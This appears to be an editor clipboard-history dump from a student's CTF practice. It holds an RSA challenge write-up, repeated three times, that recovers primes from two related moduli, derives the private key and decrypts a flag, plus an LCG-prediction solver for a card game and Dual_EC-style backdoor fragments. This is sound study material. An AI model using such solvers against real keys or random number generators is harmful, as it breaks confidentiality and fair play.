0acde1767a1f7160c3c71872a4a5880c|file:///home/neo/ecsc-practice/ecsc.crypto.1.txt|2|1|V|text
	16665162598091416675035243372929255215330237988600063606115453406246759269279788760269977993441302227754535063989940158801403082299136924692382379772238783511717805089453627769958409474798262234585212880036578100065244955419654350030210214612873050000707217728997449651244785327256673209001617229204596903739745000294771409411741050416912250410842101344110865361910624576900847453308353320549785990249062848385268654951594713494728031930339317011245422247813046177464952338694367015023462166849724348822067012372916419798329882575892837697474973759070677459272935998500533063881083981623170007582400032456357369057331
79d39b2c6e06e00a1d2dd8d15ec214d9|file:///home/neo/ecsc-practice/ecsc.crypto.1.txt|4|1|V|text
	12327967666608400089684292637697723886692743047311943117634453297696672596602132832770180763706410481136385428797064430470744303260875130025364968184033440278168149230015012651339700361911455246276535179299003908649820055478166532502332896978314839548456221498409689020137730201961802661796522959185289676293168958100994789278927928614060667061494784764996405812503722093377901735054396731379083755482112808051044511509930814761992548239396939638987562480503407989092943629763956630828533555667490559450650474172687439499014071217245302164885369990725379389835929411041979972161099398047802667999958241746711037377019
c30d732ca5feedce8b232a75a9e7b839|file:///home/neo/CTFs/scripts/crypto/fermat_factorization.sage|3|1|V|python
	n = 16665162598091416675035243372929255215330237988600063606115453406246759269279788760269977993441302227754535063989940158801403082299136924692382379772238783511717805089453627769958409474798262234585212880036578100065244955419654350030210214612873050000707217728997449651244785327256673209001617229204596903739745000294771409411741050416912250410842101344110865361910624576900847453308353320549785990249062848385268654951594713494728031930339317011245422247813046177464952338694367015023462166849724348822067012372916419798329882575892837697474973759070677459272935998500533063881083981623170007582400032456357369057331
53ce4b0c457499451e4b3251da5afbc2|file:///home/neo/ecsc-practice/ecsc.crypto.1.txt|6|1|V|text
	651462892194717457221755220174856890047929116650078860763950453454949587828096234616831315488704251531401792609600066162972268247282594239275742779598127716518383086923760296725577120504817396207799394031948181614036825015620143890966541423830037471615505961486852765107641800802598611031433822941186606730
c3c8103ccf05897bcb023606ffe6ee01|file:///home/neo/ecsc-practice/ecsc.crypto.1.txt|8|1|V|text
	442296418993240063675266142454740191465599525570774611710139968474930425844945295951472133337584882919079119792948035796322583493017921438477858246253211352232247225094327539626813294415765610979636199753519138117254187197466480294243789769005210602152862859358315543589192060482998253522480707816974954144
73c628006d818d49d81c669d0cadf447|file:///home/neo/ecsc-practice/ecsc.crypto.1.txt|10|1|V|text
	7899134322955645246464106475661567371519411492907819361218537936109003314263398594946847506479710018156056516572597388680265129465680577498126784603599657304217232946737359907830193767343579320119617475061103397775839997585822041520474984253434505877605909867411822079954503549880731554010164405517963598831678530319685550356656748243909520671642189043288332595811057445820791781035731118992393238366930032136586970961554635691292784903624264141333213116074342104788426932419021114413087179933685563867060402709899375500659953038354210747849030819495299042436380277429490866466199179979698665821921998413237763283416
bbc1098aef6eec891a2e322b2ef93f1c|file:///home/neo/ecsc-practice/crypto1.sage|11|1|V|python
	        q1 = q2 + (k*a+b)
	        p1 = n1/q1
	        phi = (p1-1) * (q1-1)
	        print('K:', k)
	        print('Phi: ', phi)
1d2ca92a832acd90ed844e48f9924caf|file:///home/neo/ecsc-practice/crypto1.sage|13|1|V|python
	        assert is_prime(q1)
	        assert is_prime(q2)
4bfa208d7e7b619a908101168a85af72|file:///home/neo/ecsc-practice/crypto1.sage|8|5|V|python
	    prin(k)
b5ff1642024328855bdc925204efa1a4|file:///home/neo/ecsc-practice/crypto1.sage|17|1|V|python
	        d = inverse_mod(e, phi)
6b59fdaabade0760e041a4dd75225e6f|file:///home/neo/ecsc-practice/crypto1.sage|20|1|V|python
	        print('D: ', d)
b8784da08ea5b8c4a34d92c95f9d9a16|file:///home/neo/ecsc-practice/crypto1.sage|27|1|V|python
	    try:
	        q2 = Integer(sol[1].right())
	        q1 = q2 + (k*a+b)
	        assert is_prime(q1)
	        assert is_prime(q2)
	        p1 = n1/q1
	        phi = (p1-1) * (q1-1)
	        d = inverse_mod(e, phi)
	        print('K:', k)
	        print('Phi: ', phi)
	        print('D: ', d)
	        break
	    except:
	        pass
8e986f0806e642e390932d7dbb1edf6d|file:///home/neo/ecsc-practice/crypto1.sage|16|13|V|python
	            print(q2)
327ce95ded6f7aaa5f03b9c8311a3438|file:///home/neo/ecsc-practice/crypto1.sage|27|13|V|python
	            return
4990ec0329d752d281f20f67fdfffc93|file:///home/neo/ecsc-practice/crypto1.sage|30|5|V|python
	    break
3e8118253e4eca58e93585a281247bc5|file:///home/neo/ecsc-practice/crypto1.sage|11|25|v|python
	 and not found
30af905c499c80b6f130492757fd4837|file:///home/neo/ecsc-practice/crypto1.sage|24|13|V|python
	            # pt = IntegerMod(R,ct ^ d)
0b2021a926a3eae2ee2e4aa69f2e7412|file:///home/neo/ecsc-practice/crypto1.sage|1|1|V|python
	from sage.all import *
a94bb92f61a69fae0505cdd6c4f08df8|file:///home/neo/ecsc-practice/sol_crypto1.md|4|1|V|markdown
	    - (p1-p2) % (q1-q2) (let's call this 'a')
5f8d98ed576975cf30c6efbc259e9205|file:///home/neo/ecsc-practice/sol_crypto1.md|4|25|v|markdown
	(let's call this 'a')
c9652ae5f98cc51b307d00bcbdcf273c|file:///home/neo/ecsc-practice/sol_crypto1.md|5|24|v|markdown
	 (let's call this 'b')
500c5ecf17657036bc4d1243beef1c40|file:///home/neo/ecsc-practice/crypto1.sage|9|1|V|python
	R = IntegerModRing(n1)
c35b6e3a0eec60ec6f3c9a09d68ac1fa|file:///home/neo/ecsc-practice/sol_crypto1.md|16|28|v|markdown
	(p1-p2)\*(q1-q2)
c7c88d53dabc908dac0e38380ad75860|file:///home/neo/ecsc-practice/sol_crypto1.md|18|10|^v|markdown
	p1\*q2 - p2\*q1 
3764d543b2f87baffbe5608ce78c732a|file:///home/neo/ecsc-practice/sol_crypto1.md|19|1|V|markdown
	= n1 - p1\*q2 - p2\*q1 + n2
8b0abf0a40fcfea4c731032ff2d0c134|file:///home/neo/ecsc-practice/sol_crypto1.md|22|1|V|markdown
	Also, we know that p2 = n2/q2, so we can replace that in the equation:
700ce1abe68dc091cf4e464ad7674da5|file:///home/neo/ecsc-practice/sol_crypto1.md|21|1|V|markdown
	a * (k\*a + b) = n1 - p1\*q2 - p2\*q1 + n2
5c58d65f5729f3d6581263571f9f308d|file:///home/neo/ecsc-practice/sol_crypto1.md|23|17|v|markdown
	 n1 - p1\*q2 - p2\*q1 + n2
8b814173f7f3d703d1b32aeaf48004d6|file:///home/neo/ecsc-practice/sol_crypto1.md|21|1|v|markdown
	a * (k\*a + b) =
006532a6218217f1dfe796b02010cd4d|file:///home/neo/ecsc-practice/sol_crypto1.md|24|8|v|markdown
	a\*q2 - p2\*q2 - k\*a\*p2 - b\*p2 - p2\*q2 + n2
daa54baaec64707cfb2276e9249dfa88|file:///home/neo/ecsc-practice/sol_crypto1.md|25|1|V|markdown
	= n1 - a\*q2 - n2 - k\*a\*p2 - b\*p2 - n2 + n2
d712279cd3920637fef00f666084a7f1|file:///home/neo/ecsc-practice/sol_crypto1.md|26|3|v|markdown
	n1 - a\*q2 - n2 - k\*a\*p2 - b\*p2 
ca7b6cffa6a08767cad6b5b36a329d17|file:///home/neo/ecsc-practice/sol_crypto1.md|26|1|V|markdown
	= n1 - a\*q2 - n2 - k\*a\*p2 - b\*p2 
a517a4b3a6b096361dc72daa55d462ac|file:///home/neo/ecsc-practice/sol_crypto1.md|27|35|v|markdown
	 - b\*p2 
6c7b015339d609610029a1cc721642da|file:///home/neo/ecsc-practice/sol_crypto1.md|27|1|V|markdown
	= n1 - a\*q2 - n2 - (k\*a + b)\*p2
0d9ae446c12f5403c18514591ecbf085|file:///home/neo/ecsc-practice/crypto1.sage|7|1|V|python
	u = var('u')
	e = 65537
	found = False
	for k in range(61, 1000):
	    print(k)
	    sol = solve([a * (k*a+b) == n1 - n2 - a * u - (k*a+b)*n2/u],u)
	    for i in range(2):
	        try:
	            q2 = Integer(sol[i].right())
	            q1 = q2 + (k*a+b)
	            assert is_prime(q1)
	            assert is_prime(q2)
	            p1 = n1/q1
	            phi = (p1-1) * (q1-1)
	            d = inverse_mod(e, phi)
	            pt = pow(ct, d, n1)
	            print('K:', k)
	            print('Phi: ', phi)
	            print('D: ', d)
	            print('Plaintext:', pt)
	            found = True
	            break
	        except:
	            pass
	    if found:
	        break
98dd31a73c05fd849e47065f19937c51|file:///home/neo/ecsc-practice/crypto1.sage|11|1|V|python
	    print(k)
ad274de5d6c3c4360b8105166ec30076|file:///home/neo/ecsc-practice/crypto1.sage|7|1|V|python
	u = var('u')
	e = 65537
	found = False
	for k in range(1, 1000):
	    sol = solve([a * (k*a+b) == n1 - n2 - a * u - (k*a+b)*n2/u],u)
	    for i in range(2):
	        try:
	            q2 = Integer(sol[i].right())
	            q1 = q2 + (k*a+b)
	            assert is_prime(q1)
	            assert is_prime(q2)
	            p1 = n1/q1
	            phi = (p1-1) * (q1-1)
	            d = inverse_mod(e, phi)
	            pt = pow(ct, d, n1)
	            print('K:', k)
	            print('Phi: ', phi)
	            print('D: ', d)
	            print('Plaintext:', pt)
	            found = True
	            break
	        except:
	            pass
	    if found:
	        break
dea30d3cfcb95714e05ffc3d33c335d3|file:///home/neo/ecsc-practice/sol_crypto1.md|1|1|V|markdown
	What we know:
	    1. n1
	    2. n2
	    3. (p1-p2) % (q1-q2) = a
	    4. (q1-q2) % (p1-p2) = b (we know what a and b are)
	
	We obviously need to find p1 and q1, calculate phi and find the modular inverse of e mod phi in order to decrypt the flag.
	
	Firstly, either q1-q2 > p1-p2, or p1-p2 > q1-q2
	In the first case, p1-p2 would be equal to a, since a small number mod a bigger number results in the small number (e.g. 123 % 456 = 123) and q1-q2 = k\*a + b for some integer k (since (q1-q2) mod a = b)
	In the second case, q1-q2 = b and p1-p2 = k\*b + a
	For both cases, equations 3 and 4 need to hold for any value of p1-p2 and q1-q2
	After some trial and error, we can see that the equations don't hold for the second case, so we come to the conclusion that p1-p2 = a and q1-q2 = k\*a + b
	If we can calculate any of p1,q1,p2 or q2 we can find the other three too, since n1 = p1\*q1 , n2 = p2\*q2, p1 = a + p2 and q1 = k\*a + b + q2
	So let's try to use the equations we have and create an equation with only one unknown number.
	Let's start by calculating (p1-p2)\*(q1-q2)
	(p1-p2)\*(q1-q2) = 
	p1\*q1 - p1\*q2 - p2\*q1 + p2\*q2
	= n1 - p1\*q2 - p2\*q1 + n2
	But, p1-p2 = a and q1-q2 = k\*a + b, so
	a * (k\*a + b) = n1 - p1\*q2 - p2\*q1 + n2
	But we know that p1 = a + p2 and q1 = k\*a + b + q2, so replace them:
	a * (k\*a + b) = n1 - (a + p2)\*q2 - p2\*(k\*a + b + q2) + n2
	= n1 - a\*q2 - p2\*q2 - k\*a\*p2 - b\*p2 - p2\*q2 + n2
	= n1 - a\*q2 - n2 - k\*a\*p2 - b\*p2 - n2 + n2
	= n1 - a\*q2 - n2 - k\*a\*p2 - b\*p2 
	= n1 - a\*q2 - n2 - (k\*a + b)\*p2
	Also, we know that p2 = n2/q2, so we can replace that in the equation: 
	a * (k\*a + b) = n1 - a\*q2 - n2 - (k\*a + b)\*(n2/q2)
	
	So now we need to find a k for which the solution to this equation is a whole, prime number.
	Since the four prime numbers are probably pretty close to each other, the value for k shouldn't be too high so we can try and brute force it with sage. Solve the equation for different value of k, check if we got a whole number solution, check if the solution is prime and calculate the other primes, phi, the private key and the plaintext.
	
	```
	u = var('u')
	e = 65537
	found = False
	for k in range(1, 1000):
	    sol = solve([a * (k*a+b) == n1 - n2 - a * u - (k*a+b)*n2/u],u)
	    for i in range(2):
	        try:
	            q2 = Integer(sol[i].right())
	            q1 = q2 + (k*a+b)
	            assert is_prime(q1)
	            assert is_prime(q2)
	            p1 = n1/q1
	            phi = (p1-1) * (q1-1)
	            d = inverse_mod(e, phi)
	            pt = pow(ct, d, n1)
	            print('K:', k)
	            print('Phi: ', phi)
	            print('D: ', d)
	            print('Plaintext:', pt)
	            found = True
	            break
	        except:
	            pass
	    if found:
	        break
	```
	
	This gives us the following result for k = 63:
	
	```
	K: 63
	Phi:  16665162598091416675035243372929255215330237988600063606115453406246759269279788760269977993441302227754535063989940158801403082299136924692382379772238783511717805089453627769958409474798262234585212880036578100065244955419654350030210214612873050000707217728997449651244785327256673209001617229204596903739480002023177503001432944904848960332297792304283217774287532962260667214716202728072122395482611291316544139647262657294550769914015198163205796742232071875894262933891382767362364461718312921309316074514150060799947595182682645021833643852031817996116909999706431340875926563149071614370874668111340651534792
	D:  3562042780018379919494235152173474633510016841544618932732124926601837188825721057629458958025630736933114533414271049094252931578288753545186572102011396301816424518868218224843636417946717997193488594588589438419731622373903567987902782951571260271448291895384229896312570805258273621186423762862169361239950499234641049514687469555016620173868615813943258229431004802406997975857066509221268756823174984646263184280312728739217040526046735368878447300993131556792755774264163599267772424428187549044065178018435602052057096194806269610538255994007380662673080477835233383020125719770392223844655879135506047678401
	Plaintext: 58474574834070360605463003112911915334889917200410219053958461938263620870896990607833214791249131679561263150336526161078303732597630489752248062643581764056601641884860981446199105016510405328980406252482754858134505129882463958846112530039326643106813645402308225078841537456905089796805423088014106692691
	```
	Turning the plaintext into bytes gives us:
	
	```
	b'SECT{ju99lin_w1d_d3m_alg3br0s}\x03\xeepuXY&\xc3\xb3f\x9f
	.,\x14\x1d\x9b\x1f\xad?\xff\xf8\x8e\xda\x04G\xd1\xaeSHS\x91Ht2\x1e\
	\x96\x16\xd3\xe6;}\x15\xe4\xc2\x145]\x82\x0cS'
	```
15aebeb06178fbf18dd7428979989544|file:///home/neo/ecsc-practice/sol_crypto1.md|1|1|V|markdown
	What we know:
	    1. `n1`
	    2. `n2`
	    3. `(p1-p2) % (q1-q2) = a`
	    4. `(q1-q2) % (p1-p2) = b` (we know what a and b are)
	
	We obviously need to find p1 and q1, calculate phi and find the modular inverse of e mod phi in order to decrypt the flag.
	
	Firstly, either `q1-q2 > p1-p2`, or `p1-p2 > q1-q2`.
	
	In the first case, `p1-p2` would be equal to a, since a small number mod a bigger number results in the small number (e.g. 123 % 456 = 123) and `q1-q2 = k\*a + b` for some integer k (since `(q1-q2) mod a = b`).
	
	In the second case, `q1-q2 = b` and `p1-p2 = k\*b + a`
	
	For both cases, equations 3 and 4 need to hold for any value of `p1-p2` and `q1-q2`
	After some trial and error, we can see that the equations don't hold for the second case, so we come to the conclusion that `p1-p2 = a` and `q1-q2 = k\*a + b`.
	
	If we can calculate any of p1,q1,p2 or q2 we can find the other three too, since n1 = p1\*q1 , n2 = p2\*q2, p1 = a + p2 and q1 = k\*a + b + q2
	
	So let's try to use the equations we have and create an equation with only one unknown number.
	
	Let's start by calculating (p1-p2)\*(q1-q2)
	
	(p1-p2)\*(q1-q2) = 
	
	p1\*q1 - p1\*q2 - p2\*q1 + p2\*q2
	
	= n1 - p1\*q2 - p2\*q1 + n2
	
	But, p1-p2 = a and q1-q2 = k\*a + b, so
	
	a * (k\*a + b) = n1 - p1\*q2 - p2\*q1 + n2
	
	But we know that p1 = a + p2 and q1 = k\*a + b + q2, so replace them:
	
	a * (k\*a + b) = n1 - (a + p2)\*q2 - p2\*(k\*a + b + q2) + n2
	
	= n1 - a\*q2 - p2\*q2 - k\*a\*p2 - b\*p2 - p2\*q2 + n2
	
	= n1 - a\*q2 - n2 - k\*a\*p2 - b\*p2 - n2 + n2
	
	= n1 - a\*q2 - n2 - k\*a\*p2 - b\*p2 
	
	= n1 - a\*q2 - n2 - (k\*a + b)\*p2
	
	Also, we know that p2 = n2/q2, so we can replace that in the equation: 
	
	a * (k\*a + b) = n1 - a\*q2 - n2 - (k\*a + b)\*(n2/q2)
	
	So now we need to find a k for which the solution to this equation is a whole, prime number.
	Since the four prime numbers are probably pretty close to each other, the value for k shouldn't be too high so we can try and brute force it with sage. Solve the equation for different value of k, check if we got a whole number solution, check if the solution is prime and calculate the other primes, phi, the private key and the plaintext.
	
	```
	u = var('u')
	e = 65537
	found = False
	for k in range(1, 1000):
	    sol = solve([a * (k*a+b) == n1 - n2 - a * u - (k*a+b)*n2/u],u)
	    for i in range(2):
	        try:
	            q2 = Integer(sol[i].right())
	            q1 = q2 + (k*a+b)
	            assert is_prime(q1)
	            assert is_prime(q2)
	            p1 = n1/q1
	            phi = (p1-1) * (q1-1)
	            d = inverse_mod(e, phi)
	            pt = pow(ct, d, n1)
	            print('K:', k)
	            print('Phi: ', phi)
	            print('D: ', d)
	            print('Plaintext:', pt)
	            found = True
	            break
	        except:
	            pass
	    if found:
	        break
	```
	
	This gives us the following result for k = 63:
	
	```
	K: 63
	Phi:  16665162598091416675035243372929255215330237988600063606115453406246759269279788760269977993441302227754535063989940158801403082299136924692382379772238783511717805089453627769958409474798262234585212880036578100065244955419654350030210214612873050000707217728997449651244785327256673209001617229204596903739480002023177503001432944904848960332297792304283217774287532962260667214716202728072122395482611291316544139647262657294550769914015198163205796742232071875894262933891382767362364461718312921309316074514150060799947595182682645021833643852031817996116909999706431340875926563149071614370874668111340651534792
	D:  3562042780018379919494235152173474633510016841544618932732124926601837188825721057629458958025630736933114533414271049094252931578288753545186572102011396301816424518868218224843636417946717997193488594588589438419731622373903567987902782951571260271448291895384229896312570805258273621186423762862169361239950499234641049514687469555016620173868615813943258229431004802406997975857066509221268756823174984646263184280312728739217040526046735368878447300993131556792755774264163599267772424428187549044065178018435602052057096194806269610538255994007380662673080477835233383020125719770392223844655879135506047678401
	Plaintext: 58474574834070360605463003112911915334889917200410219053958461938263620870896990607833214791249131679561263150336526161078303732597630489752248062643581764056601641884860981446199105016510405328980406252482754858134505129882463958846112530039326643106813645402308225078841537456905089796805423088014106692691
	```
	Turning the plaintext into bytes gives us:
	
	```
	b'SECT{ju99lin_w1d_d3m_alg3br0s}\x03\xeepuXY&\xc3\xb3f\x9f
	.,\x14\x1d\x9b\x1f\xad?\xff\xf8\x8e\xda\x04G\xd1\xaeSHS\x91Ht2\x1e\
	\x96\x16\xd3\xe6;}\x15\xe4\xc2\x145]\x82\x0cS'
	```
b814c6a323adaa3caaa38cbc435a308a|file:///home/neo/ecsc-practice/sol_crypto1.md|1|1|V|markdown
	What we know:
	    1. `n1`
	    2. `n2`
	    3. `(p1-p2) % (q1-q2) = a`
	    4. `(q1-q2) % (p1-p2) = b` (we know what a and b are)
	
	We obviously need to find p1 and q1, calculate phi and find the modular inverse of e mod phi in order to decrypt the flag.
	
	Firstly, either `q1-q2 > p1-p2`, or `p1-p2 > q1-q2`.
	
	In the first case, `p1-p2` would be equal to a, since a small number mod a bigger number results in the small number (e.g. 123 % 456 = 123) and `q1-q2 = k*a + b` for some integer k (since `(q1-q2) mod a = b`).
	
	In the second case, `q1-q2 = b` and `p1-p2 = k*b + a`
	
	For both cases, equations 3 and 4 need to hold for any value of `p1-p2` and `q1-q2`
	After some trial and error, we can see that the equations don't hold for the second case, so we come to the conclusion that `p1-p2 = a` and `q1-q2 = k*a + b`.
	
	If we can calculate any of p1,q1,p2 or q2 we can find the other three too, since `n1 = p1*q1` , `n2 = p2*q2`, `p1 = a + p2` and `q1 = k*a + b + q2`
	
	So let's try to use the equations we have and create an equation with only one unknown number.
	
	Let's start by calculating `(p1-p2)*(q1-q2)`:
	`
	(p1-p2)*(q1-q2) = 
	p1*q1 - p1*q2 - p2*q1 + p2*q2
	= n1 - p1*q2 - p2*q1 + n2
	`
	
	But, `p1-p2 = a` and `q1-q2 = k*a + b`, so:
	
	`a * (k*a + b) = n1 - p1*q2 - p2*q1 + n2`
	
	But we know that `p1 = a + p2` and `q1 = k*a + b + q2`, so replace them:
	`
	a * (k*a + b) = n1 - (a + p2)*q2 - p2*(k*a + b + q2) + n2
	= n1 - a*q2 - p2*q2 - k*a*p2 - b*p2 - p2*q2 + n2
	= n1 - a*q2 - n2 - k*a*p2 - b*p2 - n2 + n2
	= n1 - a*q2 - n2 - k*a*p2 - b*p2 
	= n1 - a*q2 - n2 - (k*a + b)*p2
	`
	Also, we know that `p2 = n2/q2`, so we can replace that in the equation: 
	
	`a * (k*a + b) = n1 - a*q2 - n2 - (k*a + b)*(n2/q2)`
	
	So now we need to find a k for which the solution to this equation is a whole, prime number.
	Since the four prime numbers are probably pretty close to each other, the value for k shouldn't be too high so we can try and brute force it with sage. Solve the equation for different value of k, check if we got a whole number solution, check if the solution is prime and calculate the other primes, phi, the private key and the plaintext.
	
	```
	u = var('u')
	e = 65537
	found = False
	for k in range(1, 1000):
	    sol = solve([a * (k*a+b) == n1 - n2 - a * u - (k*a+b)*n2/u],u)
	    for i in range(2):
	        try:
	            q2 = Integer(sol[i].right())
	            q1 = q2 + (k*a+b)
	            assert is_prime(q1)
	            assert is_prime(q2)
	            p1 = n1/q1
	            phi = (p1-1) * (q1-1)
	            d = inverse_mod(e, phi)
	            pt = pow(ct, d, n1)
	            print('K:', k)
	            print('Phi: ', phi)
	            print('D: ', d)
	            print('Plaintext:', pt)
	            found = True
	            break
	        except:
	            pass
	    if found:
	        break
	```
	
	This gives us the following result for k = 63:
	
	```
	K: 63
	Phi:  16665162598091416675035243372929255215330237988600063606115453406246759269279788760269977993441302227754535063989940158801403082299136924692382379772238783511717805089453627769958409474798262234585212880036578100065244955419654350030210214612873050000707217728997449651244785327256673209001617229204596903739480002023177503001432944904848960332297792304283217774287532962260667214716202728072122395482611291316544139647262657294550769914015198163205796742232071875894262933891382767362364461718312921309316074514150060799947595182682645021833643852031817996116909999706431340875926563149071614370874668111340651534792
	D:  3562042780018379919494235152173474633510016841544618932732124926601837188825721057629458958025630736933114533414271049094252931578288753545186572102011396301816424518868218224843636417946717997193488594588589438419731622373903567987902782951571260271448291895384229896312570805258273621186423762862169361239950499234641049514687469555016620173868615813943258229431004802406997975857066509221268756823174984646263184280312728739217040526046735368878447300993131556792755774264163599267772424428187549044065178018435602052057096194806269610538255994007380662673080477835233383020125719770392223844655879135506047678401
	Plaintext: 58474574834070360605463003112911915334889917200410219053958461938263620870896990607833214791249131679561263150336526161078303732597630489752248062643581764056601641884860981446199105016510405328980406252482754858134505129882463958846112530039326643106813645402308225078841537456905089796805423088014106692691
	```
	Turning the plaintext into bytes gives us:
	
	```
	b'SECT{ju99lin_w1d_d3m_alg3br0s}\x03\xeepuXY&\xc3\xb3f\x9f
	.,\x14\x1d\x9b\x1f\xad?\xff\xf8\x8e\xda\x04G\xd1\xaeSHS\x91Ht2\x1e\
	\x96\x16\xd3\xe6;}\x15\xe4\xc2\x145]\x82\x0cS'
	```
4937d8cc69a9911527f1500ac8cc1342|file:///home/neo/Documents/thesis/appendices.tex|2|23|v|tex
	% resets `page` counter to 1
1e3b9d2da6b38286ff98df7562510bc4|file:///home/neo/Documents/thesis/appendices.tex|1|1|V|tex
	\clearpage
	\pagenumbering{arabic}
	\renewcommand*{\thepage}{A-\arabic{page}}
4a1dbf51be367295c9f70cf609f9b3a0|file:///home/neo/Documents/thesis/background.tex|27|325|v|tex
	usually
f9680a809b48c95010092cae96ac5cd1|file:///home/neo/Documents/thesis/background.tex|27|374|v|tex
	, which is a curve belonging to the twisted Edwards family of curves. 
646c7dd4fd01f76d5a959051fce85e0f|file:///home/neo/Documents/thesis/background.tex|27|416|v|tex
	To sign a message $M$, several cryptographic operations, including hashing using a cryptographic hash functions, are performed on the message and the private key
5506c64871d25abc3ccca37e6b37dbfb|file:///home/neo/Documents/thesis/appendices.tex|151|1|V|tex
	\clearpage
75e446844c3fd7706f75763d50a26348|file:///home/neo/Documents/thesis/appendices.tex|152|1|V|tex
	\pagenumbering{arabic}
6fa691d2c07bea6ae78b7022c80e9d20|file:///home/neo/Documents/thesis/implementation.tex|164|143|v|tex
	authentication
fa7b1a5060bd20a3f5b01889951fed3a|file:///home/neo/cryptohack/general/mathematics2/13385.py|73|31|v|python
	105216055594390884840438324972769319399722594046651360392070071794973423530188471087867855419188813164954561140227145977855514336985746250989366318940490798583710597151720075427387437940535767395296272532149397065590267303873620351321073058502920032770522836726669005262088263964215455869031740912313201227043
e29f5b88ef18a60fd186b973ec9f7884|file:///home/neo/cryptohack/general/mathematics2/13385.py|73|31|v|python
	122623673100774902819890811512093121818009864395929257382206929494220541500353599732762551419245399058398366502168963509640168639794202705645034115138272912046190084444976198156980059092407987735996562308131806635633617847615677949071026045920492821200676854540540234658043716124914438158326334228684623784307
d1417352f1fada9c807ce399c58e6394|file:///home/neo/cryptohack/misc/prngs/sol_sleeve.py|17|1|V|python
	def get_mul_inc(x0, x1, x2, mod):
	    mul = (x2-x1) * mod_inverse((x1-x0),mod) % mod
	    inc = (x1 - mul * x0) % mod
	    return mul, inc
	
	def rebase(n, b=52):
	    if n < b:
	        return [n]
	    else:
	        return [n % b] + rebase(n//b, b)
	
	@total_ordering
	class Card:
	    def __init__(self, value, suit):
	        self.value = value
	        self.suit = suit
	
	    def __str__(self):
	        return f"{self.value} of {self.suit}"
	
	    def __eq__(self, other):
	        return self.value == other.value
	
	    def __gt__(self, other):
	        return VALUES.index(self.value) > VALUES.index(other.value)
	
	class CustomCard:
	    def __init__(self, value, suit):
	        self.value = value
	        self.suit = suit
	
	    def __str__(self):
	        return f"{self.value} of {self.suit}"
	
	    def __eq__(self, other):
	        return self.value == other.value and self.suit == other.suit
	
	    def __gt__(self, other):
	        return VALUES.index(self.value) > VALUES.index(other.value)
	
	VALUES = ['Ace', 'Two', 'Three', 'Four', 'Five', 'Six',
	          'Seven', 'Eight', 'Nine', 'Ten', 'Jack', 'Queen', 'King']
	SUITS = ['Clubs', 'Hearts', 'Diamonds', 'Spades']
	custom_deck = [CustomCard(value, suit) for suit in SUITS for value in VALUES]
	real_deck = [Card(value, suit) for suit in SUITS for value in VALUES]
	
	mod = 2**61 - 1  # 9th mersenne prime
	# print(mod)
	
	rec = json_recv()
	round_num = rec['round']
	hand = rec['hand'].split(' ')
	value = hand[0]
	suit = hand[2]
	card = custom_deck.index(CustomCard(value, suit))
	msg = rec['msg']
	# print(msg)
	msg = msg.split()
	next_shuffle = int(msg[msg.index('after')+1]) - 1
	# print(f"{card} * (52 ** {next_shuffle})")
	rand_num = card * (52 ** next_shuffle)
	total_rounds = 0
	card_arr = []
	random_nums = []
	current_deal = []
	while next_shuffle > 0:
	    next_shuffle -= 1
	    json_send({"choice":"h"})
	    total_rounds += 1
	    rec = json_recv()
	    hand = rec['hand']
	    # print(hand)
	    hand = hand.split()
	    msg = rec['msg']
	    # print(msg)
	    msg = msg.split()
	    value = hand[0]
	    suit = hand[2]
	    current_card = Card(value, suit)
	    current_deal.insert(0, custom_deck.index(current_card))
	    card = custom_deck.index(CustomCard(value, suit))
	    # print(card)
	    card_arr.insert(0,card)
	    # print(f"{card} * (52 ** {next_shuffle})")
	    rand_num += card * (52 ** next_shuffle)
	    if 'reshuffle' in msg:
	        # print(current_deal)
	        # print('--------------\n')
	        # current_deal = reversed(current_deal)
	        # for card in current_deal:
	        #     print(custom_deck[card])
	        current_deal = []
	        random_nums.append(rand_num)
	        # print('Random num:', rand_num)
	        # print(rand_num)
	        if len(random_nums) == 3:
	            mul, inc = get_mul_inc(random_nums[0], random_nums[1], random_nums[2], mod) 
	            print('Mul: ', mul)
	            print('Inc: ', inc)
	            next_rand_num = (random_nums[2] * mul + inc) % mod
	            # print('Next random num:', next_rand_num)
	            next_deal = rebase(next_rand_num)
	            # print(next_deal)
	            while total_rounds <= 100:
	                hidden = next_deal.pop()
	                hidden_card = real_deck[hidden]
	                # print('Current card:', current_card)
	                # print('Guessed hidden card:', hidden_card, hidden)
	                if next_deal == []:
	                    next_rand_num = (next_rand_num * mul + inc) % mod
	                    next_deal = rebase(next_rand_num)
	                if hidden_card < current_card:      
	                    json_send({"choice":"l"})
	                else:
	                    json_send({"choice":"h"})
	                rec = json_recv()
	                if total_rounds == 99 or total_rounds == 98:
	                    print(rec)
	                real_hidden_card = rec['hand'].split(' ')
	                real_hidden_card = Card(real_hidden_card[0], real_hidden_card[2])
	                # print('Real hidden card:', real_hidden_card, real_deck.index(real_hidden_card))
	                current_card = hidden_card
	                total_rounds += 1
	
	            # print('Next random num: ', next_rand_num)
	        next_shuffle = int(msg[msg.index('after')+1])
	        rand_num = 0 
	        card_arr = []
a7f04f169248d5c353048e9748087d8f|file:///home/neo/cryptohack/misc/prngs/sleeve.py|1|1|V|python
	from fastecdsa.curve import P256
	from fastecdsa.point import Point
c34ca8ca512e0c3a2ae43cce0e2af858|file:///home/neo/cryptohack/misc/prngs/sleeve.py|9|1|V|python
	class RNG:
	    def __init__(self, seed, P, Q):
	        self.seed = seed
	        self.P = P
	        self.Q = Q
	
	    def next(self):
	        t = self.seed
	        s = (t * self.P).x
	        self.seed = s
	        r = (s * self.Q).x
	        return r & (2**(8 * 30) - 1)
8201740ee16e20c88cc086f37d8a77f4|file:///home/neo/cryptohack/misc/prngs/sleeve.py|64|1|V|python
	            casino_x = "0x6b17d1f2e12c4247f8bce6e563a440f277037d812deb33a0f4a13945d898c296"
	            casino_y = "0x4fe342e2fe1a7f9b8ee7eb4a7c0f9e162bce33576b315ececbb6406837bf51f5"
	            P = Point(int(casino_x, 16), int(casino_y, 16))
23fae57dab60760bf5ab634c6ef821ed|file:///home/neo/cryptohack/misc/prngs/sol_sleeve.py|8|1|V|python
	Q = Point(0xd19761748936051e5fb436f5c383a2ca6fbd1e61f227a3d70f44d73311781b32, 0xdc4c729f6de383957f62d1318197757cd2015ae6f27066ef9990fcf6d4319d82)
	d = 0x561021d34971c6b5da29dbefb21413a469a751356392133a4a78981fb51f3a01
e6a421b9c5ad396a922e281f2f0451da|file:///home/neo/cryptohack/misc/prngs/sleeve.py|30|14|v|python
	rng = RNG(random.getrandbits(60), P, Q)
951732b26cd97fdb7ebe7edaad1dc6de|file:///home/neo/cryptohack/misc/prngs/sol_sleeve.py|20|1|v|python
	    ...:
